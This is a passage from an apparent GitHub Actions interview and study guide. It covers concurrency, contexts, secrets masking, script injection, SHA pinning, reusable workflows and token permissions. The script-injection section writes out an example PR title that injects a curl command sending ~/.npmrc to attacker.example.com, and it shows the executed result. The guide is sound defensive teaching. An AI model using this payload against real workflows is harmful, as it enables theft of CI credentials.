- **Debugging is harder** — the matrix isn't visible until the discovery job runs, so a malformed output produces a confusing "invalid matrix" error.

**GA3.9 — Concurrency groups**

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# for deployments — queue, never cancel
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

**A concurrency group allows only one run at a time.** A new run either **cancels the in-progress one** (`cancel-in-progress: true`) or **queues behind it** (`false`).

**The two patterns, and getting them the right way round is the item:**

- **PR builds — cancel.** A new push makes the previous run's result irrelevant, so cancelling saves minutes and gives faster feedback. `group: ${{ github.workflow }}-${{ github.ref }}` gives one run per branch.
- **Deployments — queue, never cancel.** **Cancelling a deployment mid-flight leaves a partially-applied change** (C9.7) and, in a Terraform context, a held state lock (TF3.5). `cancel-in-progress: false` with a group keyed on the environment.

**The details:**

- **Only one run can be queued** per group — a third run cancels the queued one (not the running one), which is usually fine and occasionally surprising.
- **Group names are arbitrary strings**, so you choose the granularity: per branch, per environment, per repository.
- **`concurrency` at job level** is also supported, for finer control.
- **A cancelled run's status** is `cancelled`, not `failure` — so `always()` runs and `failure()` doesn't (GA3.4).

**The cost benefit** (GA10.4): cancelling superseded PR runs is one of the easiest meaningful savings in a busy repository.

**GA3.10 — Timeouts**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20              # job level
    steps:
      - run: ./integration-tests.sh
        timeout-minutes: 15          # step level
```

**The default job timeout is 360 minutes (6 hours)** — which is effectively no timeout for most purposes.

**Why setting one matters:**

- **A hung job consumes a runner for six hours**, blocking the queue and burning minutes (GA10.3). **On a self-hosted pool, it blocks capacity for everyone.**
- **It's the difference between "the build is slow" and "the build is stuck"** — a timeout converts an invisible hang into a clear failure.
- **In a deployment context, a hung job holds a concurrency group** (GA3.9) or a state lock (TF9.4), blocking everyone else.

**Setting them sensibly**: **modestly above the p95 duration** — long enough that a legitimately slow run isn't killed, short enough that a hang is caught quickly. **Measure first** (GA10.4); a timeout set by guesswork either fires spuriously or never.

**Step-level timeouts** for the specific risky step — a network operation, an external API call, a test suite known to occasionally hang — give a more precise failure than a job-level one.

**The related mechanism**: a job cancelled by timeout runs `if: always()` steps (GA3.4), so cleanup still happens — which is why cleanup steps should use `always()` or `!cancelled()` deliberately.

**GA3.11 — `defaults` and working directory**

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./services/api

jobs:
  build:
    defaults:
      run:
        working-directory: ./services/worker    # job level overrides workflow level
    steps:
      - uses: actions/checkout@v4               # ← NOT affected by working-directory
      - run: npm ci                             # runs in ./services/worker
      - run: ./script.sh
        working-directory: ./tools              # step level overrides both
```

**The precedence**: step > job > workflow.

**The details that catch people:**

- **`working-directory` applies only to `run` steps**, not to `uses` steps. **`actions/checkout` still checks out to the workspace root**, and an action's own file paths are unaffected — so a composite action's relative paths don't inherit it.
- **The directory must exist** when the step runs, or the step fails — which means it can't be used before the checkout.
- **`shell: bash` explicitly** is worth setting at the workflow level: it enables `pipefail` (GA1.5), which the default doesn't. **A genuinely valuable one-line improvement** that catches silent failures in pipelines.

**The use case**: a monorepo where most steps operate in one subdirectory, avoiding a `cd` in every step or a long relative path in every command.

**GA3.12 — Container jobs and service containers**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:20-slim              # the job's steps run inside this
      options: --cpus 2
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: test
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-retries 10
        ports: ['5432:5432']
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
        env:
          DATABASE_URL: postgres://postgres:test@postgres:5432/postgres
```

- **`container:`** — the job's steps execute **inside** that container rather than directly on the runner. **Gives you a controlled, reproducible environment** with exactly the tooling you specify, rather than relying on the runner image's contents.
- **`services:`** — sidecar containers started before the job, on the same Docker network, for dependencies.

**The networking detail that matters**: **if the job runs in a container, services are reachable by their label as a hostname** (`postgres:5432`) via the Docker network (D5.3). **If the job runs directly on the runner, they're reachable on `localhost` via the mapped port** — so `ports:` is needed in that case and not in the container case. **Getting this wrong is the most common services-container failure.**

**Health checks are essential** — without them, the job starts before Postgres is accepting connections and the first test fails (D7.2's `depends_on` argument, same problem).

**The tradeoffs**: container jobs have startup cost (pulling the image) and some Actions features behave differently inside them; **the pre-installed toolset of the runner image is unavailable**, so you install what you need. **Services are much better than starting containers manually in a step**, because lifecycle and cleanup are handled.

---

## GA4. Expressions, contexts & data

**GA4.1 — Using the contexts confidently**

| Context | Contains | Common use |
|---|---|---|
| `github` | Event payload, ref, sha, actor, repository, event_name | Conditions, tagging, traceability |
| `env` | Environment variables set in the workflow | Reading configured values |
| `secrets` | Secrets available to this workflow | Credentials |
| `vars` | Organisation/repo/environment **variables** (non-secret) | Non-sensitive config |
| `needs` | Outputs and results of needed jobs | Passing data (GA3.2) |
| `matrix` | The current matrix leg's values | Parameterising a job |
| `runner` | `os`, `arch`, `temp`, `tool_cache`, `name` | Cross-platform conditionals |
| `job` | `status`, `container`, `services` | Conditional logic on job state |
| `steps` | Outputs, `outcome`, `conclusion` per step id | Reading a step's result |
| `inputs` | `workflow_dispatch` or `workflow_call` inputs | Parameterisation |

```yaml
- run: echo "${{ github.repository }} @ ${{ github.sha }} on ${{ runner.os }}"
- if: steps.build.outcome == 'failure'
- run: ./deploy.sh ${{ needs.build.outputs.digest }}
```

**The `vars` context is worth naming** as the newer addition — organisation, repository, and environment **variables** for non-secret configuration, which removes the anti-pattern of storing non-sensitive values as secrets (where they're masked in logs and therefore harder to debug).

**The subtleties**: **`github.actor` is who triggered the run**, which for a `workflow_run` or a bot-triggered event may not be a human; **`github.event` is the full webhook payload** and its shape varies entirely by event type; and **`github.token`** is the same value as `secrets.GITHUB_TOKEN`.

**GA4.2 — Which contexts are available where**

**The availability rules, which is the substance of the item:**

| Location | Available | Notably **not** available |
|---|---|---|
| `runs-on` | `github`, `needs`, `vars`, `inputs`, `matrix` | `secrets`, `env`, `steps` |
| Job `if` | `github`, `needs`, `vars`, `inputs` | **`secrets`**, `env`, `steps`, `runner` |
| Job `env` | `github`, `needs`, `secrets`, `vars`, `inputs`, `matrix` | `steps`, `runner`, `job` |
| Step `if` | Most, including `env`, `steps`, `runner`, `job` | — |
| Step `with`/`run` | Everything | — |
| `concurrency` | `github`, `inputs`, `vars` | `secrets`, `needs`, `matrix` |

**Why some fail at job level, which is the conceptual answer**: **job-level fields are evaluated before the job is assigned to a runner.** At that point there is no runner, so `runner.os` is meaningless; no steps have executed, so `steps` is empty; and **`secrets` is deliberately excluded from job-level `if` to prevent leaking their existence through conditional job execution.**

**The practical consequences and workarounds:**

- **`if: secrets.MY_SECRET != ''` at job level fails.** The workaround: set it as a job-level `env` (which *can* access secrets), then condition on the env at step level — or emit a boolean from an earlier job's output.
- **`runs-on: ${{ env.RUNNER }}` fails** — `env` isn't available there. Use `vars` or an input.
- **`concurrency` can't use `needs`**, so a dynamic concurrency group based on a previous job's output isn't possible.

**The error message** — "Unrecognized named-value" or "Unable to evaluate" — is what you'll actually see, and recognising it as a context availability problem rather than a typo is the useful skill.

**GA4.3 — Expression functions**

```yaml
if: contains(github.event.head_commit.message, '[skip deploy]')
if: startsWith(github.ref, 'refs/tags/v')
if: endsWith(github.repository, '-infra')

run: echo "${{ format('Deploying {0} to {1}', inputs.version, inputs.environment) }}"
run: echo "${{ join(matrix.tags, ',') }}"

# JSON round-tripping — the important pair
outputs:
  config: ${{ toJSON(matrix) }}
strategy:
  matrix:
    include: ${{ fromJSON(needs.discover.outputs.matrix) }}
```

- **`contains(haystack, needle)`** — works on strings **and arrays**, which is useful: `contains(github.event.pull_request.labels.*.name, 'deploy')`.
- **`startsWith` / `endsWith`** — the idiomatic way to match refs.
- **`format`** — placeholder substitution; **safer than string concatenation** and clearer.
- **`join(array, separator)`.**
- **`toJSON`** — serialise, and **the standard debugging trick: `echo '${{ toJSON(github) }}'` dumps the entire context** so you can see what's actually available. Worth knowing.
- **`fromJSON`** — parse, and it's what makes dynamic matrices work (GA3.8). **Also used to coerce a string to a number or boolean**: `fromJSON('true')`.
- **`hashFiles('**/package-lock.json')`** — the cache key primitive (GA9.1).
- **`success()`, `failure()`, `always()`, `cancelled()`** (GA3.4).

**The operators**: `==`, `!=`, `<`, `>`, `&&`, `||`, `!`, and `[]`/`.` for property access. **Comparison is loose** — `'1' == 1` is true, which occasionally produces surprising results.

**GA4.4 — Environment variable precedence**

```yaml
env:
  LOG_LEVEL: info                    # workflow level
jobs:
  build:
    env:
      LOG_LEVEL: debug               # job level — overrides workflow
    steps:
      - run: ./build.sh
        env:
          LOG_LEVEL: trace           # step level — overrides both
```

**Precedence, most specific wins: step > job > workflow.**

**And the runtime layer on top**: **`$GITHUB_ENV` written by a step** (GA4.5) sets a variable for **subsequent steps in the same job**, and it **overrides** the workflow and job level for those steps — but not a step-level `env:`, which is applied last.

**The details that matter:**

- **Default environment variables** (`GITHUB_*`, `RUNNER_*`, `CI=true`) are always present, and **you shouldn't overwrite them** — some tooling depends on them.
- **`env` at any level can reference `secrets`** (GA4.2), which is the standard way to get a secret into a step's environment.
- **`env` is per-job**, so a variable set in one job doesn't exist in another (GA1.3).
- **`vars` vs `env`** — `vars` is repository/org/environment configuration set in GitHub's UI; `env` is set in the workflow file. Both end up as environment variables when you assign them.

**The debugging point**: **when a variable has an unexpected value, check all four levels plus `$GITHUB_ENV`** — and `env | sort` in a step shows what's actually in effect (with the caveat about not doing that where secrets are present, GA4.7).

**GA4.5 — `$GITHUB_OUTPUT` and `$GITHUB_ENV`**

```yaml
- id: meta
  run: |
    echo "version=1.4.2" >> "$GITHUB_OUTPUT"          # step output
    echo "BUILD_ID=xyz" >> "$GITHUB_ENV"              # env var for later steps

- run: echo "${{ steps.meta.outputs.version }} / $BUILD_ID"
```

**The distinction:**

- **`$GITHUB_OUTPUT`** — sets a **step output**, read via `steps.<id>.outputs.<name>`. **Requires the step to have an `id`.** Can be promoted to a job output (GA3.2).
- **`$GITHUB_ENV`** — sets an **environment variable** for all **subsequent steps in the same job**. Not available in the same step that sets it.

**Multi-line values need a delimiter**, and this is the syntax people forget:

```yaml
- run: |
    {
      echo 'CHANGELOG<<EOF'
      cat CHANGELOG.md
      echo 'EOF'
    } >> "$GITHUB_ENV"
```

**The security consideration that matters** (GA4.9): **`$GITHUB_ENV` is a write to a file the runner reads back and applies as environment variables.** If untrusted input is written to it unescaped, **an attacker can inject arbitrary environment variables** — including overwriting `PATH` or `NODE_OPTIONS`, which is a code-execution primitive. **This has been a real vulnerability class**, and it's why the delimiter syntax must use a random or unguessable delimiter when the content is untrusted.

**The deprecated forms**: `::set-output::` and `::set-env::` were **disabled** for exactly this injection reason — using them in an answer dates you and misses the security context.

**GA4.6 — Writing to the job summary**

```yaml
- name: Report
  run: |
    {
      echo "## Deployment Summary"
      echo ""
      echo "| Field | Value |"
      echo "|---|---|"
      echo "| Version | ${VERSION} |"
      echo "| Digest | \`${DIGEST}\` |"
      echo "| Environment | ${ENVIRONMENT} |"
      echo ""
      echo "### Test Results"
      echo "- Passed: ${PASSED}"
      echo "- Failed: ${FAILED}"
    } >> "$GITHUB_STEP_SUMMARY"
```

**`$GITHUB_STEP_SUMMARY` accepts Markdown** and renders it on the workflow run's summary page — **prominently, without needing to open a job or read logs.**

**Why it's valuable and under-used:**

- **The run page is where people look first.** A summary with the deployed version, the test results, and links is far more useful than the same information buried in a step's log (GA1.7).
- **It survives log truncation** and is easier to find than scrolling.
- **It's the right place for**: test results with counts, a Terraform plan summary (TF9.2), a coverage delta, the deployed artefact digest (C3.8), links to the deployed environment, and a security scan summary.
- **Multiple steps append**, so each stage can contribute.

**The practicalities**: **1MB limit per step**; it supports GitHub-flavoured Markdown including tables, code blocks, and collapsible `<details>` sections (useful for a long plan output); and **each job gets its own summary**, aggregated on the run page.

**The pairing worth mentioning**: for a PR, a summary plus a **PR comment** (via the API with `GITHUB_TOKEN`) gives visibility in both places — though take care not to post secrets (GA4.7) and to update rather than append a comment on each push (C2.10's stale-comment point).

**GA4.7 — Masking, and why secrets still leak**

**GitHub automatically masks registered secret values in logs** — any exact match is replaced with `***`.

**Why that's insufficient, which is the item:**

- **Transformation defeats it.** A secret that is **base64-encoded, URL-encoded, JSON-escaped, uppercased, or split across lines** no longer matches the registered string, **so it prints in full.** `echo $SECRET | base64` is the canonical example, and it's a real leak path.
- **Partial values aren't masked** — printing the first 20 characters of a key masks nothing.
- **Derived values aren't secrets** — a token exchanged for another token, a signed URL containing a credential, a connection string assembled from parts.
- **Secrets in error messages from tools** may be transformed (quoted, escaped) by the tool.
- **`$GITHUB_OUTPUT` and job outputs are not masked** (GA3.2), and neither are artifacts (GA9.5) or the job summary (GA4.6).
- **Multi-line secrets** are masked line by line, so a value with a blank line may partially leak.
- **`env | sort` or `printenv`** in a debug step dumps everything — masked if it's an exact match, and it's a bad habit regardless.

**The mitigations:**

- **`::add-mask::`** to register a derived value at runtime: `echo "::add-mask::$DERIVED_TOKEN"`.
- **Never echo, encode, or transform a secret** in a step.
- **Avoid debug output that dumps the environment.**
- **Treat any secret that appeared in a log as leaked and rotate it** (S6.4) — logs are retained, visible to anyone with repository read access, and may be in an export.
- **Prefer OIDC so there's no long-lived secret to leak** (GA6.5) — **the structural answer.**

**GA4.8 — Expressions evaluate before the shell runs**

**The mechanism, and understanding it is what makes GA4.9 obvious:**

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

**GitHub does not pass the expression to the shell.** It **substitutes the value into the script text**, and *then* the resulting script is written to a file and executed. So if the PR title is:

```
"; curl https://attacker.example.com/x?d=$(cat ~/.npmrc | base64); echo "
```

the script that actually executes is:

```bash
echo "Title: "; curl https://attacker.example.com/x?d=$(cat ~/.npmrc | base64); echo ""
```

**The quoting you wrote is irrelevant** — the attacker's content closed it. **This is template injection, structurally identical to SQL injection** (DB13.7), and the fix is the same in shape: **don't interpolate untrusted data into an interpreted string.**

**The consequences:**

- **Arbitrary code execution on the runner**, with everything the job has: secrets, the `GITHUB_TOKEN`, cloud credentials (GA6.5), and write access to the workspace.
- **It applies to every `${{ }}` in a `run` block**, and also to `with:` inputs that an action passes to a shell.

**The mental model to carry**: **`${{ }}` is a text macro applied to the script before execution, not a variable reference.** Once that's clear, GA4.9's rule follows immediately.

**GA4.9 — Avoiding script injection from `github.event`**

**The rule: never interpolate untrusted `github.event` values directly into a `run` block.**

**The untrusted fields** — anything a user can set: `github.event.pull_request.title` and `.body`, `github.event.issue.title` and `.body`, `github.event.comment.body`, `github.event.review.body`, `github.event.head_commit.message`, `github.event.pull_request.head.ref` (**the branch name — a branch can be named almost anything**), `github.event.head_commit.author.name` and `.email`, and `github.event.client_payload.*` (GA2.8).

**The fix — pass through an environment variable:**

```yaml
# UNSAFE
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

**Why this works**: the value becomes an environment variable set by the runner, **not text substituted into the script.** The shell reads it as data. **Quote the variable** (`"$TITLE"`) so word splitting doesn't reintroduce a problem.

**The other defences:**

- **Use an action rather than a `run` block** where one exists — actions receive inputs as arguments, not as script text.
- **Validate or sanitise** if the value must be used structurally.
- **Least-privilege `GITHUB_TOKEN`** (GA6.4) and no secrets in PR workflows, so a successful injection achieves less.
- **`actionlint` and CodeQL's Actions queries** detect this pattern — **worth running in CI**, because it's easy to introduce and hard to spot in review.

**The framing for an interview**: this is **the most common exploitable vulnerability in real GitHub Actions workflows**, it's present in a large number of public repositories, and the fix is a two-line change. Knowing both the mechanism (GA4.8) and the remedy is a strong signal.

---

## GA5. Actions & reuse

**GA5.1 — Marketplace actions and version references**

```yaml
- uses: actions/checkout@v4                                       # major tag — moves
- uses: actions/checkout@v4.1.7                                   # specific version
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # SHA — immutable
- uses: ./.github/actions/my-action                               # local
- uses: docker://alpine:3.20                                      # Docker image
- uses: acme/private-repo/.github/actions/deploy@v2                # another repo, subdirectory
```

**The reference forms and their properties:**

- **A major version tag (`@v4`)** — the convention: maintainers move `v4` forward as they release `v4.x.y`. **Convenient, and mutable** (GA5.2).
- **A full semantic version (`@v4.1.7`)** — pinned to a release, and **still a tag, so still movable.**
- **A branch (`@main`)** — **never do this.** The action changes with every commit upstream.
- **A commit SHA** — **immutable** (GA5.2).

**The practicalities**: an action lives in a repository with an `action.yml` at the root (or in a subdirectory, referenced as `owner/repo/path@ref`); **the marketplace listing is optional** — any public repository with an `action.yml` can be used; and **verified creator badges** exist but are a weak signal.

**The judgement**: **evaluate a marketplace action as third-party code running in a privileged environment** (GA10.7, S7.1) — check its maintenance, its permissions, what it does, and whether a five-line `run` step would do instead (GA1.5).

**GA5.2 — Pinning to a commit SHA**

```yaml
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.1.0
```

**Why a tag isn't enough: a git tag is a mutable pointer.** The maintainer — **or an attacker who compromises the maintainer's account** — can repoint `v4` at any commit, and **every workflow using `@v4` picks it up on the next run**, silently, with no PR, no review, and no notification.

**This is not theoretical.** The **`tj-actions/changed-files` compromise in March 2025** worked exactly this way: an attacker repointed the tags for many versions at malicious code that **dumped runner memory — including secrets — into the build logs.** **Thousands of repositories were affected within hours. Workflows pinned to a SHA were unaffected.**

**The practice:**

- **Pin every third-party action to a full commit SHA**, with the version in a trailing comment so it remains readable.
- **Automate updates** — **Dependabot and Renovate both understand SHA pinning** and raise PRs updating the SHA and the comment together. **So you get updates as reviewed changes** (S7.2's argument).
- **Pin `actions/*` too** — lower risk, and the marginal cost is zero.
- **Review the diff on update** for anything with access to secrets.
- **Combine with an org-level allowlist** (GA5.9).

**The generalisation worth stating**: this is the same principle as pinning container base images by digest (D2.15) and Terraform modules to tags rather than branches (TF4.3). **Any mutable reference in your supply chain is a mechanism for code to change without review.**

**GA5.3 — Writing a composite action**

```yaml
# .github/actions/setup-app/action.yml
name: 'Setup application'
description: 'Checks out, installs Node, and restores dependencies'
inputs:
  node-version:
    description: 'Node version'
    required: false
    default: '20'
  working-directory:
    required: false
    default: '.'
outputs:
  cache-hit:
    description: 'Whether the dependency cache was restored'
    value: ${{ steps.cache.outputs.cache-hit }}
runs:
  using: 'composite'
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
    - id: cache
      uses: actions/cache@v4
      with:
        path: ~/.npm
        key: npm-${{ hashFiles('**/package-lock.json') }}
    - run: npm ci
      shell: bash                                    # ← REQUIRED in composite actions
      working-directory: ${{ inputs.working-directory }}
```

**The requirements and gotchas:**

- **`shell:` is mandatory on every `run` step** in a composite action — omitting it is the most common error and gives a confusing validation failure.
- **`inputs` are accessed via `inputs.*`**, not `github.event.inputs`.
- **Outputs must be declared** and reference a step's output.
- **Secrets are not automatically available** — they must be passed as inputs, which is a meaningful difference from reusable workflows (GA5.7).
- **`github.action_path`** gives the action's own directory, needed to reference bundled scripts.

**When a composite action is right** (GA5.7): **a reusable sequence of steps within a job.** It's the lightweight option — no separate runner, no separate job, and it composes into an existing job's flow.

**GA5.4 — JavaScript vs Docker actions**

| | JavaScript | Docker |
|---|---|---|
| Startup | **Fast** — Node is already on the runner | **Slow** — build or pull the image |
| Platforms | **Linux, macOS, Windows** | **Linux only** |
| Language | JavaScript/TypeScript | **Any** |
| Dependencies | Must be **bundled** into the repository | Whatever's in the image |
| Access to the runner | Direct filesystem and environment | Through the container boundary |
| Self-hosted runners | Works everywhere | Needs Docker on the runner |

**When each is appropriate:**

- **JavaScript for anything that needs to run on multiple platforms**, anything latency-sensitive (it starts in milliseconds), and anything interacting closely with the Actions toolkit (`@actions/core`, `@actions/github`). **The default choice for a general-purpose action.**
- **Docker when the logic needs a specific runtime or a complex set of system dependencies** that would be painful to bundle — a Python tool with native dependencies, a Go binary with a large toolchain, an existing CLI.
- **Composite (GA5.3) for anything that's just a sequence of shell steps** — no compilation, no bundling, easiest to maintain. **Frequently the right answer and under-used**, because people reach for JavaScript by default.

**The JavaScript packaging detail that catches people**: **the action's `node_modules` must be committed**, or the action must be bundled with `@vercel/ncc` into a single `dist/index.js`. **There is no install step at runtime** — GitHub checks out the action's repository and runs the entry point directly. **Forgetting to rebuild and commit `dist/` after a change is the classic action-authoring bug.**

**GA5.5 — Designing reusable workflows**

```yaml
# .github/workflows/deploy.yml (in a shared repository)
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
      image_digest:
        type: string
        required: true
      dry_run:
        type: boolean
        default: false
    secrets:
      AWS_ROLE_ARN:
        required: true
    outputs:
      url:
        description: 'The deployed service URL'
        value: ${{ jobs.deploy.outputs.url }}
```

**The design principles** (mirroring TF4.1's module interface argument):

- **Inputs are the public API.** Every one is a contract you must support. **Expose what genuinely varies; don't parameterise everything** (TF4.5's over-abstraction warning).
- **Type the inputs** (`string`, `boolean`, `number`, `choice`) so mistakes fail early.
- **Sensible defaults**, so the minimal call is short.
- **Declare secrets explicitly** rather than relying on `secrets: inherit` — **explicit is auditable**, and `inherit` passes everything including secrets the workflow shouldn't see.
- **Outputs for anything the caller needs** — the deployed URL, the version, the result.
- **Descriptions on everything**, because they're the documentation.
- **Version it** (GA5.8) and let callers pin.

**The permissions consideration**: the called workflow inherits the caller's `permissions:` and **can only reduce, never expand.** So the caller must grant what the reusable workflow needs (`id-token: write` for OIDC), which is worth documenting in the workflow's header comment because the failure is an opaque permissions error.

**GA5.6 — Reusable workflow limits**

The constraints that shape the design:

- **Nesting depth: up to 4 levels** (a caller calling a workflow that calls another, and so on). **You cannot nest indefinitely.**
- **A maximum of 20 reusable workflows** can be called from a single workflow file, counting nested ones.
- **`strategy` (matrix) cannot be used *inside* a reusable workflow's calling job** in the caller — you can matrix over calls to a reusable workflow, but the reusable workflow itself defines its own jobs and can't be matrixed by the caller in the way a normal job can. **This is the limitation people hit most**, and the workaround is to matrix the caller job that invokes it.
- **`env` set in the caller is not propagated** to the called workflow — inputs are the only channel.
- **Secrets must be passed explicitly** or with `inherit`.
- **Outputs from a called workflow** come from its jobs' outputs, and **if the job producing them is skipped, the output is empty** — which propagates confusingly.
- **They're called at job level only** (GA2.6), so they can't be inserted mid-job.

**The practical implication**: **reusable workflows compose coarsely.** They're good for "run this whole standard build" or "do this whole deployment", and poor for fine-grained sharing within a job — **which is what composite actions are for** (GA5.7).

**GA5.7 — Composite action vs reusable workflow**

| | Composite action | Reusable workflow |
|---|---|---|
| Granularity | **Steps within a job** | **Whole jobs** |
| Invoked at | Step level (`uses:` in `steps`) | Job level (`uses:` on a job) |
| Runs on | The **caller's** runner | **Its own** runner(s) |
| Can define multiple jobs | **No** | **Yes** |
| Can use `strategy`/matrix | No | Yes (within itself) |
| Secrets | **Passed as inputs** | **Declared and passed, or inherited** |
| Can set `permissions` | No — uses the caller's | Yes (bounded by the caller) |
| Can use `environment` | No | **Yes** — so approval gates work |
| Nesting | Actions can call actions | Up to 4 levels |
| Appears in the run graph | No — part of the calling job | **Yes** — as its own job(s) |

**Choosing:**

- **Composite action** for **a sequence of steps** you repeat — setup, authentication, a standard build step, a notification. **It runs inline on the caller's runner**, so it shares the workspace and is cheap.
- **Reusable workflow** for **a whole stage** — an entire build-and-publish flow, a deployment with an environment gate (GA7.1), or anything needing multiple jobs or its own permissions.

**The decisive questions**: **does it need its own runner or multiple jobs?** → reusable workflow. **Does it need an environment approval gate?** → reusable workflow, because composite actions can't declare one. **Is it just steps?** → composite action.

**The common pattern**: **both** — a reusable workflow defining the standard deploy job's structure, which internally uses composite actions for the repeated step sequences.

**GA5.8 — Versioning and releasing an internal action**

**The convention, following what the ecosystem expects:**

1. **Semantic version tags** on releases: `v1.0.0`, `v1.1.0`.
2. **A moving major tag** — `v1` repointed to the latest `v1.x.y` — so consumers can track minor updates without a PR.
3. **A GitHub Release** with notes describing the change (C6.3).

```bash
git tag -a v1.2.0 -m "Add cache-hit output"
git push origin v1.2.0
git tag -fa v1 -m "Update v1 to v1.2.0"        # move the major tag
git push origin v1 --force
```

**The release automation**: `actions/publish-action` or a workflow that moves the major tag on release. **Doing it by hand is where the major tag drifts.**

**For an internal action specifically:**

- **Recommend consumers pin to a SHA** (GA5.2), even for internal actions — **an internal repository can be compromised too**, and it makes updates reviewable.
- **Communicate breaking changes** and version them as a major bump.
- **Document the inputs and outputs** in the README, which is what consumers read.
- **Test the action** — a workflow in its own repository that calls it with representative inputs (TF4.8's argument).
- **Know your consumers** — GitHub's dependency graph shows which repositories use an action within an organisation, which is what makes a deprecation plannable (TF4.9).

**The organisational point**: **an internal action used by many repositories is a product with an API** (C12.3, TF8.8), and breaking it breaks other teams' pipelines. Version and deprecate accordingly.

**GA5.9 — Enforcing an allowlist at org level**

**Organisation Settings → Actions → General → Policies:**

- **Allow all actions** — the default, and the most permissive.
- **Allow enterprise/organisation actions only** — internal actions only, which is very restrictive.
- **Allow select actions** — the useful middle: enable **actions created by GitHub**, optionally **actions by Marketplace verified creators**, and **an explicit allowlist** of patterns:

```
actions/*
docker/*
aws-actions/*
hashicorp/setup-terraform@*
acme/*
```

**Why it matters** (GA10.7, S7.1): **every third-party action is arbitrary code executing in a privileged environment with access to secrets.** An allowlist means an engineer cannot introduce an unvetted dependency into that environment by adding one line to a workflow — **which is otherwise trivially easy and completely unreviewed in most organisations.**

**The related org-level controls worth naming:**

- **Require actions to be pinned to a SHA** — not natively enforceable, so it's done with a policy check (`actionlint`, or a required workflow scanning for tag references).
- **Default `GITHUB_TOKEN` permissions** set to read-only org-wide (GA6.4) — **a one-setting change with disproportionate value.**
- **Restrict who can approve workflows from fork PRs.**
- **Disable Actions for repositories that don't need it.**
- **Required workflows** (rulesets) to enforce a security scan on every repository.

**The rollout advice**: **start in a permissive allowlist and audit what's actually used** before tightening — going straight to a restrictive list breaks pipelines and generates exception requests, which is the same measure-then-enforce sequencing as A1.11.

---

## GA6. Secrets, permissions & OIDC

**GA6.1 — Secrets at repository, environment, and organisation level**

| Level | Scope | Use for |
|---|---|---|
| **Organisation** | Many repositories, with a repository access policy | Shared credentials — a registry token, a shared service account |
| **Repository** | One repository, all workflows and branches | Repository-specific credentials |
| **Environment** | One environment, **gated by its protection rules** | **Per-environment credentials — production, staging** |

**Precedence: environment > repository > organisation** — the most specific wins.

**Why environment secrets are the important ones** (GA7.4, C5.11): **an environment secret is only available to a job that declares `environment: production`** — and that declaration triggers the environment's protection rules (GA7.1). **So the production credential is unavailable until the required reviewer has approved and the branch policy is satisfied.** That's a real access control, enforced by the platform, rather than a naming convention.

**The practices:**

- **Organisation secrets with a repository allowlist**, not "all repositories" — otherwise every repository in the org can use the production registry token.
- **Environment-scoped for anything per-environment**, which is most credentials.
- **`vars` rather than `secrets` for non-sensitive configuration** (GA4.1) — storing a non-secret as a secret makes it masked and therefore harder to debug, for no benefit.
- **Prefer OIDC over stored secrets entirely** (GA6.5) — **the structural answer**, because a secret that doesn't exist can't leak, be rotated wrongly, or be exfiltrated.

**GA6.2 — Why fork PRs get no secrets**

**A pull request from a fork runs code the repository owner does not control.** If that workflow had access to secrets, **anyone who can open a PR — which is anyone on the internet for a public repository — could exfiltrate every credential** by submitting a PR that prints them, uploads them, or sends them somewhere.

**So for `pull_request` events from a fork:**

- **`secrets.*` is empty.**
- **`GITHUB_TOKEN` is read-only** (GA6.3), regardless of the workflow's `permissions:`.
- **No write access** to the repository, packages, or deployments.

**This is correct and non-negotiable**, and understanding *why* is what makes GA2.3 and GA2.4 make sense.

**The consequences to design around:**

- **A workflow that needs secrets cannot run on fork PRs** — so a build that publishes to a registry, or a test needing an API key, will fail. **Structure the workflow so the fork-safe part (build, unit test, lint) runs without secrets**, and the privileged part runs after merge.
- **`pull_request_target` is the escape hatch and is dangerous** (GA2.4).
- **The `workflow_run` pattern** (GA2.7) is the safe alternative: an unprivileged workflow builds and uploads an artefact; a privileged workflow triggered by its completion does the rest **without executing the fork's code.**
- **For an internal repository with no forks**, this doesn't apply — a PR from a branch in the same repository gets full secrets. **Which is worth knowing, because it means a malicious insider or a compromised account has a straightforward path** (GA10.7).

**GA6.3 — `GITHUB_TOKEN`: scope and lifetime**

**An automatically-generated installation token**, created at the start of each job and **available as `secrets.GITHUB_TOKEN` and `github.token`.**

**Its properties:**

- **Lifetime: the duration of the job**, maximum 24 hours. **Revoked when the job completes** — so even if it leaks, the window is short.
- **Scope: the repository the workflow runs in**, and nothing else. **It cannot access other repositories**, which is the most common reason people need an alternative (GA6.8).
- **Permissions**: configurable per workflow or per job (GA6.4). **Defaults to read/write on everything, or read-only, depending on the org/repo setting.**
- **Read-only for fork PRs** (GA6.2), regardless of configuration.
- **Actions performed with it don't trigger further workflows** (GA2.11).
- **It appears as `github-actions[bot]`** in the audit log and on commits.

**What it can do with appropriate permissions**: push commits, create and comment on PRs and issues, create releases, publish packages to GHCR, create deployments, and update check runs.

**When it's not enough** (GA6.8): **cross-repository access**, **triggering other workflows** (GA2.11), and **operations requiring a real user or an app identity** — for which a GitHub App installation token is the right answer.

**GA6.4 — Least-privilege `permissions`**

```yaml
permissions:                     # workflow level — applies to all jobs
  contents: read

jobs:
  build:
    permissions:                 # job level — overrides
      contents: read
      packages: write            # push to GHCR
      id-token: write            # OIDC (GA6.5)
    runs-on: ubuntu-latest
```

**The available scopes**: `actions`, `checks`, `contents`, `deployments`, `id-token`, `issues`, `packages`, `pages`, `pull-requests`, `security-events`, `statuses`, and others — each `read`, `write`, or `none`. **`permissions: {}` grants nothing.**

**The default risk, which is the item's focus:**

